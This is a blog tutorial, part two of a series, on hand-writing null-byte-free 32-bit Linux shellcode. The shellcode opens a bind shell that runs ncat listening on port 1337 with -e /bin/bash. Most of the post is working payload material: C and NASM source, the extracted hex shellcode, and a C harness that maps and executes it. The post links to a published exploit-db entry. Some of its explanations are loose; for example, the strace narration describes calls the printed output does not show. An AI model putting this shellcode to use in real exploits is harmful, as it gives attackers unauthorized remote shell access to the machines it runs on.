---
layout: post
title: "How to create your own shellcode Part II"
date: 2018-12-11 14:00:00 -0500
categories: linux shellcode linux-exploit-dev asm
tags: asm linux shellcode linux-exploit-dev
image:
  path: /assets/img/headers/shellcode-part-2/shellcode5.jpg
---

## How to Make Your Own Shellcode Part II!

Hello Hackers Part two of `"How to Make Your Own Shellcode`. Before I start, I'd like to thank him for helping, [NytroRST](https://twitter.com/NytroRST).

Let's get started! We will use code written in ASM (Assembly Language) to make the shellcode.When we got to machine level, we got the best lines of code. To figure out how to make this bad code, you need to remember what I said in the first part:

Assembly Language x86/x64, a general understanding of C/C++, and an understanding of how the Linux system works.

This time, we'll make a shellcode that runs the command `/usr/bin/ncat -lvp 1337 -e /bin/bash`.

Now, as a computer enthusiast and a developer-in-progress, I was able to document and make my own version of shellcode in about two days. I could say that there are a lot of different shellcodes on the internet, just as newer operating systems don't allow `nc` commands with the `-e` argument anymore, so I made a shellcode that lets you use `ncat` to access the terminal. Since `ncat` is a tool for debugging networks, it is hard to make a shellcode that will run it.

Let's see what our shellcode does for the first time!!

On your Linux prompt, type `/usr/bin/ncat -lvp1337 -e/bin/bash` to open a ncat listener on port 1337. If you don't have the ncat tool installed, type `sudo apt install nmap` instead.

![shellcode](/assets/img/headers/shellcode-part-2/shellcode8.png)
![shellcode](/assets/img/headers/shellcode-part-2/shellcode9.png)

## Allocate in registry specific value (syscall, strings, argument)!

Before make the program in C language, we must keep in mind that each register must have values specific to each parameter used by the ncat. For Example:
```sh
EAX = 11 (this value at EAX register represents system call for execve)
EBX = "/usr/bin/ncat" (char *)
ECX = arguments (char **)
EDX = env (char **)
ESI contain the Index Source ,specified for strings
```
- EAX need to containt the syscall number in our case 11.
- EBX need to containt the path and ncat program.
- ECX store all the argument.
- EDX allocate the environment.
- ESI index source.

Now that we understand this, we will be able to make our own program in the C computer language.
```c
#include <"stdio.h">
#include <"unistd.h">

int main()
{
char *env[1] = {NULL};
char *arguments[7]= { "/usr/bin/ncat",
"-lvp",
"1337",
"-e",
"/bin/bash",
NULL
};
execve("/usr/bin/ncat", arguments, env);
}
```
We can observ inside the `main()`, an array of character pointers `env` is declared and initialized with a single `NULL` value. This array is used to pass environment variables to the `execve()` function.

Another array of character pointers arguments is declared and initialized with command-line arguments to be passed to the execve() function. Here's a breakdown of the values:
- `/usr/bin/ncat`: The path to the ncat command-line utility.
- `-lvp`: Flags/options to be passed to ncat.
- `1337`: A port number to listen on.
- `-e`: An option to execute a program.
- `/bin/bash`: The path to the bash shell.
- `NULL`: A NULL terminator indicating the end of the arguments array.

The `execve()` function is called with three arguments:

- `/usr/bin/ncat`: The path to the executable file to be executed.
- `arguments`: The array of command-line arguments.
- `env`: The array of environment variables.

Let's compile the code and execute:
```sh
gcc -m32 shellcode.c -o shellcode
```
![shellcode](/assets/img/headers/shellcode-part-2/shellcode10.png)

Now we use `strace ./shellcode` to see what syscall is executing!!
```sh
execve("./shellcode", ["./shellcode"], 0x7ffeb39575a0 /* 63 vars */) = 0
strace: [ Process PID=5815 runs in 32 bit mode. ]
brk(NULL)                               = 0x56e7b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=108639, ...}) = 0
mmap2(NULL, 108639, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fab000
close(3)
```
## Deal with NULL bytes!
Here we can see the first system call execve executing out program, followed by the opening of the dynamic linker/loader ld.so to load shared libraries, followed by the opening of libc which loads the standard C library, followed by its identification as an ELF file ("\177ELF"), followed by our program being mapped in the memory, and finally our call to exit. So it works.Now let's try to extract shellcode ,i will use my own tool in python for extract this shellcode!

You can find this tool on my github: [https://github.com/T3jv1l/Sh3llshock](https://github.com/T3jv1l/Sh3llshock)
```sh
t3jv1l@t3jv1l:~$ Sh3llshock.py
Usage:  [argument] [file] [argument]:
      -f    --file     The Elf x84/x64  file
      -s    --show     Show shellcode
      -i    --intel    Syntax
 Example: ./Sh3llshock.py -f '/home/T3jv1l/Desktop/Python/hello.o' -s

t3jv1l@t3jv1l:~$ Sh3llshock.py -f "shellcode" -s
[+] Shellcode =
\x53\x83\xec\x08\xe8\xbf\x00\x00
\x00\x81\xc3\x0f\x1c\x00\x00\x8b
\x83\x24\x00\x00\x00\x85\xc0\x74
\x05\xe8\x62\x00\x00\x00\x83\xc4
\x08\x5b\xc3
[+] We have a shellcode...
```
Now we have our own shellcode, but there's a problem: it has a NULL BYTES in it.

Null byte is a byte with the value zero \x53\x83\xec\x08\xe8\xbf\ **x00\x00\x00** \x81\xc3\x0f\x1c\ **x00\x00** \x8b\x83\x24\ **x00\x00\x00** \x85\xc0\x74\x05\xe8\x62\ **x00\x00\x00** \x83\xc4\x08\x5b\xc3 . It is in many character sets, such as ISO/IEC 646 (or ASCII), the C0 control code, the Universal Coded Character Set (or Unicode), and EBCDIC. It can be used in almost all popular computer languages. Most of the time, this happens when we try to get shellcode out of a C program.

Even if we try to run this shellcode, the program will stop at the first Null Byte (/x00).

If we look is full of those bits we do not want! In the first part of shellcode you will see that I did not have any problems with those bits

I speak with [NytroRST](https://twitter.com/NytroRST) and he said: "To avoid NULL bytes, all you have to do is to replace the instructions in the machine code with contain NULL .For example, to make a 0 register.". You can do this using the next instruction in assembly language:
```sh
mov eax, 0
```
But this will contain NULL bytes and a void replacing the instruction with 
```sh
xor eax, eax
```
Which has the same result,`EAX` becomes `0`, but there is no `NULL` in machine language.Then I remembered that in college I used an XOR method on an electric circuit which can also be applied here.

Although,I tried to run as much as I could from ASM,we need to write in Assembly Language so I can get rid of those NULL. I will put in references,link with cours in Assembly language and i will put a article writen by NytroRST about Shellcode for Windows.

How can we use the method XOR? it's very easy, I'll put a little schema to understand.
```sh
0 XOR 0 = 0
0 XOR 1 = 1
1 XOR 0 = 1
1 XOR 1 = 0
```
You need to remember two ideas :
- You can't have NULL in your shellcode! 
- XOR is your friend!

## Start To Build Shellcode!

Now let's start building our assembly code:
```c
global _start:
  _start:
  jmp short todo

  shellcode:

  xor eax, eax            ;Zero out eax
  xor ebx, ebx            ;Zero out ebx
  xor ecx, ecx            ;Zero out ecx
  cdq	      		  ;Zero out edx using the sign bit from eax
  mov BYTE al, 0xa4       ;Setresuid syscall 164 (0xa4)
  int 0x80                ;Syscall execute
  pop esi                 ;Esi contain the string in db
  xor eax, eax            ;Zero out eax
  mov[esi+13], al         ;Null terminate "/usr/bin/ncat"
  mov[esi+22], al         ;Null terminate "-lvp1337"
  mov[esi+34], al         ;Null terminate "-e/bin/bash"
  mov[esi+35], esi        ;Store address of "/usr/bin/ncat" in AAAA
  lea ebx, [esi+14]       ;Load address of "-lvp1337"
  mov[esi+39], ebx        ;Store address of "-lvp1337" in BBBB taken from ebx
  lea ebx, [esi+23]       ;Load address of "-e/bin/bash" into ebx
  mov[esi+43], ebx        ;Store address of "-e/bin/bash" in CCCC taken from ebx
  mov[esi+47], eax        ;Zero out DDDD
  mov al, 11              ;11 is execve syscall number
  mov ebx, esi            ;Store address of "/usr/bin/ncat"
  lea ecx, [esi+35]       ;Load address of ptr to argv[] array
  lea edx, [esi+47]       ;envp[] NULL
  int 0x80                ;Syscall execute

  todo:
  call shellcode
  db "/usr/bin/ncat#-lvp1337#-e/bin/bash#AAAABBBBCCCCDDDD"
  ;   012345678901234567890123456789012345678901234567890
  ;We commented down of it number to have a focus on the command.
```
The shellcode performs a series of instructions to achieve a specific purpose, likely related to privilege escalation or executing arbitrary code. Here's a breakdown of the instructions:
- `xor` instructions are used to zero out registers.
- `cdq` extends the sign bit of `eax` into `edx`, effectively zeroing out `edx`.
- `mov BYTE al, 0xa4` sets al to `0xa4`, which corresponds to the `setresuid` system call number.
- `int 0x80` triggers a software interrupt, invoking the system call.
- `pop esi` retrieves the value from the top of the stack and stores it in esi. This likely holds the address of the string defined after the `todo` label.
- `mov [esi+35]`, `esi` stores the address of `/usr/bin/ncat` in the string at position `AAAA`.
- `lea` instructions are used to calculate the addresses of specific portions of the string and store them in registers.
- `mov al, 11` sets `al` to `11`, which corresponds to the `execve` system call number.
- `mov ebx, esi` stores the address of `/usr/bin/ncat` in ebx.
- `lea ecx, [esi+35]` loads the address of the pointer to the `argv[]` array into `ecx`.
- `lea edx, [esi+47]` loads the address of the `envp[]` array (NULL) into `edx`.
- `int 0x80` triggers a software interrupt, invoking the system call.
- `todo` is a label that marks the start of the todo section.
- `call shellcode` calls the shellcode procedure, executing the instructions defined earlier.    
- The `db` directive is used to define a string containing the command `/usr/bin/ncat -lvp1337 -e/bin/bash`.

Now all we have to do is compile the program and extract that shellcode! Look Part 1 to see how it is compiled!
```sh
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -s -o shellcode shellcode.o
```
Now we use Sh3llshock.py to extract the shellcode! We obtain:
```sh
t3jv1l@t3jv1l:~/Desktop/OSCE/Shellcode/test$ Sh3llshock.py -f "shellcode" -s
  [+] Shellcode =
  \xeb\x35\x31\xc0\x31\xdb\x31\xc9
  \x99\xb0\xa4\xcd\x80\x5e\x31\xc0
  \x88\x46\x0d\x88\x46\x16\x88\x46
  \x22\x89\x76\x23\x8d\x5e\x0e\x89
  \x5e\x27\x8d\x5e\x17\x89\x5e\x2b
  \x89\x46\x2f\xb0\x0b\x89\xf3\x8d
  \x4e\x23\x8d\x56\x2f\xcd\x80\xe8
  \xc6\xff\xff\xff\x2f\x75\x73\x72
  \x2f\x62\x69\x6e\x2f\x6e\x63\x61
  \x74\x23\x2d\x6c\x76\x70\x31\x33
  \x33\x37\x23\x2d\x65\x2f\x62\x69
  \x6e\x2f\x62\x61\x73\x68\x23\x41
  \x41\x41\x41\x42\x42\x42\x42\x43
  \x43\x43\x43\x44\x44\x44\x44
  [+] We have a shellcode....
```
Now it's time to test this shellcode with C program!
```c
#include <'stdio.h'>    //IO header
#include <'sys/mman.h'> //MMAN sys func
#include <'string.h'>   //Functions on favor of strings
#include <'stdlib.h'>   //Define Var types
#include <'unistd.h'>   //Defines misc symbolic constants and types, and declares misc functions

int (*shellcodetotest)();  /* Global Variable type int, shellcode to test is a function pointer */

char shellcode[] = "\xeb\x35\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x0d\x88\x46\x16\x88\x46\x22\x89\x76\x23\x8d\x5e\x0e\x89\x5e\x27\x8d\x5e\x17\x89\x5e\x2b\x89\x46\x2f\xb0\x0b\x89\xf3\x8d\x4e\x23\x8d\x56\x2f\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x61\x74\x23\x2d\x6c\x76\x70\x31\x33\x33\x37\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x23"; /* Global array */

int main(int argc, char **argv) {
	void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0); /* Mmap functions passed to *ptr pointer */
	if(ptr == MAP_FAILED){
		perror("mmap");  /* Func to error of program */
		exit(-1);
printf("Shellcode Length:  %d\n", strlen(shellcode));
	}
	memcpy(ptr, shellcode, sizeof(shellcode)); /* Memcpy function */
	shellcodetotest = ptr;	/* Here we test the shellcode with mmap functions */
	shellcodetotest();   /* Exec the shellcode */
	return 0;      /* return */
}
```
Remove this part from your shellcode `\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44`.

Let's test!!! Use Shellcode to listen port 1337!!!

![shellcode](/assets/img/headers/shellcode-part-2/shellcode11.png)
![shellcode](/assets/img/headers/shellcode-part-2/shellcode12.png)

Final code can be found here [https://www.exploit-db.com/exploits/45980](https://www.exploit-db.com/exploits/45980).

## References!!
[https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe](https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe)

[https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/](https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/)

[https://0x00sec.org/t/linux-shellcoding-part-1-0/289](https://0x00sec.org/t/linux-shellcoding-part-1-0/289)

[https://www.exploit-db.com/papers/35538](https://www.exploit-db.com/papers/35538)

[http://www.vividmachines.com/shellcode/shellcode.html](http://www.vividmachines.com/shellcode/shellcode.html)

[https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X](https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X)

[https://www.exploit-db.com/exploits/45980](https://www.exploit-db.com/exploits/45980)
